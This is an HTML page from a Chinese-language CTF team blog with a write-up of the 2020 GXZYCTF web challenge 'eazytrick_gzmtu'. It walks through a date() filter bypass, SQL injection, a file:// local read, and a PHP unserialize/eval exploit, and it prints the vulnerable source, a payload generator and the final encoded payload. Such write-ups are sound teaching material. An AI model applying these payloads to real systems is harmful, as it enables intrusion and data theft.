@@ -1,0 +1,614 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 4.2.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/48x48.png">
+  <link rel="icon" type="image/png" sizes="64x64" href="/images/48x48.png">
+  <link rel="icon" type="image/png" sizes="48x48" href="/images/48x48.png">
+  <link rel="mask-icon" href="/images/logo1.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css">
+  <link rel="stylesheet" href="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.css">
+  <link rel="stylesheet" href="/lib/pace/pace-theme-minimal.min.css">
+  <script src="/lib/pace/pace.min.js"></script>
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"boiteam.github.io","root":"/","scheme":"Mist","version":"7.7.2","exturl":false,"sidebar":{"position":"left","display":"always","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":true,"style":"mac"},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":true,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="首先进入页面提示 1?time&#x3D;Y 或者 Y&#x3D;2020">
+<meta property="og:type" content="article">
+<meta property="og:title" content="2020 GXZYCTF eazytrick_gzmtu">
+<meta property="og:url" content="https://boiteam.github.io/2020/03/09/2020_GXZYCTF_eazytrick_gzmtu/index.html">
+<meta property="og:site_name" content="BOI Team">
+<meta property="og:description" content="首先进入页面提示 1?time&#x3D;Y 或者 Y&#x3D;2020">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://boiteam.github.io/2020/03/09/2020_GXZYCTF_eazytrick_gzmtu/1584694675(1).jpg">
+<meta property="article:published_time" content="2020-03-09T01:52:20.000Z">
+<meta property="article:modified_time" content="2020-03-21T08:48:01.373Z">
+<meta property="article:author" content="BOI Team">
+<meta property="article:tag" content="SQL">
+<meta property="article:tag" content="file读取本地文件">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://boiteam.github.io/2020/03/09/2020_GXZYCTF_eazytrick_gzmtu/1584694675(1).jpg">
+
+<link rel="canonical" href="https://boiteam.github.io/2020/03/09/2020_GXZYCTF_eazytrick_gzmtu/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true
+  };
+</script>
+
+  <title>2020 GXZYCTF eazytrick_gzmtu | BOI Team</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+<link rel="alternate" href="/atom.xml" title="BOI Team" type="application/atom+xml">
+</head>
+
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <div>
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">BOI Team</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+<nav class="site-nav">
+  
+  <ul id="menu" class="menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-fw fa-home"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-fw fa-tags"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-fw fa-th"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-fw fa-archive"></i>归档</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+
+</nav>
+  <div class="site-search">
+    <div class="popup search-popup">
+    <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocorrect="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result"></div>
+
+</div>
+<div class="search-pop-overlay"></div>
+
+  </div>
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+  <div class="reading-progress-bar"></div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content">
+            
+
+  <div class="posts-expand">
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block " lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://boiteam.github.io/2020/03/09/2020_GXZYCTF_eazytrick_gzmtu/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/header.png">
+      <meta itemprop="name" content="BOI Team">
+      <meta itemprop="description" content="Because Of Interest">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="BOI Team">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          2020 GXZYCTF eazytrick_gzmtu
+        </h1>
+
+        <div class="post-meta">
+          
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2020-03-09 09:52:20" itemprop="dateCreated datePublished" datetime="2020-03-09T09:52:20+08:00">2020-03-09</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2020-03-21 16:48:01" itemprop="dateModified" datetime="2020-03-21T16:48:01+08:00">2020-03-21</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Web/" itemprop="url" rel="index"><span itemprop="name">Web</span></a>
+                </span>
+                  ，
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Web/PHP/" itemprop="url" rel="index"><span itemprop="name">PHP</span></a>
+                </span>
+            </span>
+
+          
+            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span><br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-file-word-o"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>2.2k</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-clock-o"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>2 分钟</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>首先进入页面提示</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?time=Y 或者 Y=<span class="number">2020</span></span><br></pre></td></tr></table></figure>
+
+<p>然后经过测试，发现这是经过date函数处理的，而绕过这个函数，只需要在每个字符前面添加反斜杠</p>
+<p><img src="/2020/03/09/2020_GXZYCTF_eazytrick_gzmtu/1584694675(1).jpg" alt="1584694675(1)"></p>
+<p>然后就是正常的SQL注入，基本没有过滤任何函数</p>
+<p>得到数据库的内容为</p>
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url： /eGlhb2xldW5n username： <span class="keyword">admin</span> <span class="keyword">password</span>： <span class="number">20200202</span>goodluck</span><br></pre></td></tr></table></figure>
+
+<p>访问 /eGlhb2xldW5n，登录后台后存在文件读取</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url=file:<span class="regexp">//</span>localhost<span class="regexp">/var/</span>www<span class="regexp">/html/i</span>ndex.php</span><br></pre></td></tr></table></figure>
+
+<p>这儿使用file://localhost绕过本地</p>
+<p>然后读取得到的源码为：</p>
+<p>index.php</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">include</span>(<span class="string">'conn.php'</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">$time = date($_GET[<span class="string">'time'</span>]);</span><br><span class="line">$sql = <span class="string">"select * from `content` where `createtime` = '$time' "</span>;</span><br><span class="line">$r = $conn-&gt;query($sql);</span><br><span class="line">$content = $r-&gt;fetch_array(MYSQL_ASSOC);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>eGlhb2xldW5n/check.php</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span><span class="keyword">include</span>(<span class="string">"../conn.php"</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">empty</span>($_SESSION[<span class="string">'login'</span>]))</span><br><span class="line">		&#123;<span class="keyword">die</span>(<span class="string">'请登录!'</span>);&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'url'</span>]))&#123;</span><br><span class="line">	$url = $_GET[<span class="string">'url'</span>];</span><br><span class="line">	$parts = parse_url($url);</span><br><span class="line">	<span class="keyword">if</span>(<span class="keyword">empty</span>($parts[<span class="string">'host'</span>]) || $parts[<span class="string">'host'</span>] != <span class="string">'localhost'</span>) &#123;   </span><br><span class="line">	<span class="keyword">die</span>(<span class="string">'请从本地访问'</span>);&#125;	</span><br><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">"/flag|fl|la|ag|fla|lag|log/is"</span>, $parts[<span class="string">'path'</span>]))&#123;		</span><br><span class="line">readfile($url);	&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;	<span class="keyword">die</span>(<span class="string">'不要搞这些奇奇怪怪的东西。'</span>);	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>/eGlhb2xldW5n/eGlhb2xldW5nLnBocA==.php</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">	<span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">trick</span></span>&#123;</span><br><span class="line">	<span class="keyword">public</span> $gf;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">content_to_file</span><span class="params">($content)</span></span>&#123;	</span><br><span class="line">		$passwd = $_GET[<span class="string">'pass'</span>];</span><br><span class="line">		<span class="keyword">if</span>(preg_match(<span class="string">'/^[a-z]+\.passwd$/m'</span>,$passwd)) </span><br><span class="line">	&#123; </span><br><span class="line">	<span class="keyword">if</span>(strpos($passwd,<span class="string">"20200202"</span>))&#123;</span><br><span class="line">		<span class="keyword">echo</span> file_get_contents(<span class="string">"/"</span>.$content);</span><br><span class="line">	&#125;</span><br><span class="line">	 &#125; </span><br><span class="line">	&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">aiisc_to_chr</span><span class="params">($number)</span></span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(strlen($number)&gt;<span class="number">2</span>)&#123;</span><br><span class="line">	$str = <span class="string">""</span>;</span><br><span class="line">	 $number = str_split($number,<span class="number">2</span>);</span><br><span class="line">	 <span class="keyword">foreach</span> ($number <span class="keyword">as</span> $num ) &#123;</span><br><span class="line">	 	$str = $str .chr($num);</span><br><span class="line">	 &#125;</span><br><span class="line">	 <span class="keyword">return</span> strtolower($str);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> chr($number);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">calc</span><span class="params">()</span></span>&#123;</span><br><span class="line">	$gf=<span class="keyword">$this</span>-&gt;gf;</span><br><span class="line">	<span class="keyword">if</span>(!preg_match(<span class="string">'/[a-zA-z0-9]|\&amp;|\^|#|\$|%/'</span>, $gf))&#123;</span><br><span class="line">	  	<span class="keyword">eval</span>(<span class="string">'$content='</span>.$gf.<span class="string">';'</span>);</span><br><span class="line">	  	$content =  <span class="keyword">$this</span>-&gt;aiisc_to_chr($content); </span><br><span class="line">	  	<span class="keyword">return</span> $content;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;content_to_file(<span class="keyword">$this</span>-&gt;calc());</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">unserialize((base64_decode($_GET[<span class="string">'code'</span>])));</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>绕过正则用<code>%0a</code>，两位的限制，它最后有个<code>tolowercase()</code>，可以用大写绕过，</p>
+<p>字母的过滤，利用取反操作</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">a = <span class="string">'FLAG'</span></span><br><span class="line">res = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> a:</span><br><span class="line">    res += str(ord(i))</span><br><span class="line">print(res)</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">trick</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $gf;</span><br><span class="line">&#125;</span><br><span class="line">$s = <span class="string">"70766571"</span>;</span><br><span class="line">$s = urlencode(~$s);</span><br><span class="line">$a = <span class="keyword">new</span> trick();</span><br><span class="line">$a-&gt;gf = urldecode(<span class="string">'~'</span>.$s);</span><br><span class="line"><span class="keyword">echo</span> base64_encode(serialize($a));</span><br><span class="line"><span class="comment">//另一种写法</span></span><br><span class="line"><span class="comment">//$a = new trick();</span></span><br><span class="line"><span class="comment">//$a-&gt;gf = '~'.(~'70766571');</span></span><br></pre></td></tr></table></figure>
+
+<p>最终结果为Tzo1OiJ0cmljayI6MTp7czoyOiJnZiI7czo5OiJ+yM/IycnKyM4iO30=</p>
+<p>然后url编码传参即可</p>
+
+    </div>
+
+    
+    
+    
+        
+
+  <div class="followme">
+    <p>欢迎关注我的其它发布渠道</p>
+    <div class="social-list">
+            <div class="social-item">
+              <a target="_blank" class="social-link" href="/atom.xml">
+                <span class="icon">
+                  <i class="fa fa-rss"></i>
+                </span>
+                <span class="label">RSS</span>
+              </a>
+            </div>
+    </div>
+  </div>
+
+
+      <footer class="post-footer">
+          
+          <div class="post-tags">
+              <a href="/tags/SQL/" rel="tag"><i class="fa fa-tag"></i> SQL</a>
+              <a href="/tags/file%E8%AF%BB%E5%8F%96%E6%9C%AC%E5%9C%B0%E6%96%87%E4%BB%B6/" rel="tag"><i class="fa fa-tag"></i> file读取本地文件</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2020/03/09/2020_GXZYCTF_hackme/" rel="prev" title="2020 GXZYCTF hackme">
+      <i class="fa fa-chevron-left"></i> 2020 GXZYCTF hackme
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2020/03/09/2020_GXZYCTF_baby_java/" rel="next" title="2020 GXZYCTF baby_java">
+      2020 GXZYCTF baby_java <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+  </div>
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let activeClass = CONFIG.comments.activeClass;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="BOI Team"
+      src="/images/header.png">
+  <p class="site-author-name" itemprop="name">BOI Team</p>
+  <div class="site-description" itemprop="description">Because Of Interest</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">19</span>
+          <span class="site-state-item-name">文章</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">5</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">27</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/BOITeam" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;BOITeam" rel="noopener" target="_blank"><i class="fa fa-fw fa-github"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="/atom.xml" title="RSS → &#x2F;atom.xml"><i class="fa fa-fw fa-rss"></i>RSS</a>
+      </span>
+  </div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+      <!--<script src="https://cdn.staticfile.org/jquery/3.1.1/jquery.min.js"></script>
+<script>
+    var div = $('.post-body');
+    var toc=$('.post-toc')
+    function password() {
+        if(''){
+            div.remove();
+            toc.remove();
+            $('.post-header').after(
+            '<span class="description" value="password" style="font-style: normal;font-weight: bold;border: none;display: block;'+
+            'width: 60%;margin: 0 auto;text-align: center;outline: none;margin-bottom: 40px;resize:none ">'+
+            'Private Articles' +
+            '</span>' +
+            '<div class="qiang" style="height: 100px;width: 60%;margin:0 auto">' +
+            '<input class="password"  type="password" autocomplete="new-password" autofocus="autofocus" value="" style="border-radius: 5px;height: 30px;border: none;display: block;border-bottom: 1px solid #ccc;' +
+            'margin: 0 auto;outline: none;width:95%"/>' +
+            '</div>')
+            //绑定点击事件，如果是点击的.password 这个div就改变样式，如果是document中除了div之外的其他任何元素，就变回原来的样式。
+            document.onclick = function (event) {
+                var e = event || window.event;
+                var elem = e.srcElement || e.target;
+
+                while (elem) {
+                    if (elem != document) {
+                        if (elem.className == "password") {
+                            //$(".password").animate({paddingTop:"30px",width:"100%",borderWidth:"2px"},300)
+                            return;
+                        }
+                        elem = elem.parentNode;
+                    } else {
+                        //$(".password").animate({paddingTop:"0px",width:"95%",borderWidth:"1px"},300)
+                        return;
+                    }
+                }
+            }
+
+            $(document).keyup(function(event){
+                if(event.keyCode ==13&&$('.password').length>0){
+                    //console.log($('.password').val())
+                    //console.log('')
+                    if ($('.password').val() == '') {
+                        //恢复文章内容
+                        (div).appendTo($(".post-header"))
+                        //恢复目录
+                        toc.appendTo($(".sidebar-inner"))
+                        //删除本页面的输入密码组件
+                        $(".description").remove();
+                        $(".qiang").remove();
+                        $(".password").remove();
+
+                        $('img').lazyload({
+                            placeholder: '/images/loading.gif',
+                            effect: 'fadeIn',
+                            threshold : 100,
+                            failure_limit : 20,
+                            skip_invisible : false
+                        });
+                        $(".post-block").css({opacity:1});
+                        $(".post-header").css({opacity:1});
+                        $(".post-body").css({opacity:1});
+                        $(".pagination").css({opacity:1});
+                    }else {
+                        alert("Error Password")
+                    }
+                }
+            });
+        }
+    }
+    password();
+</script>-->
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">BOI Team</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-area-chart"></i>
+    </span>
+      <span class="post-meta-item-text">站点总字数：</span>
+    <span title="站点总字数">40k</span>
+</div>
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script>
+  <script src="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/muse.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
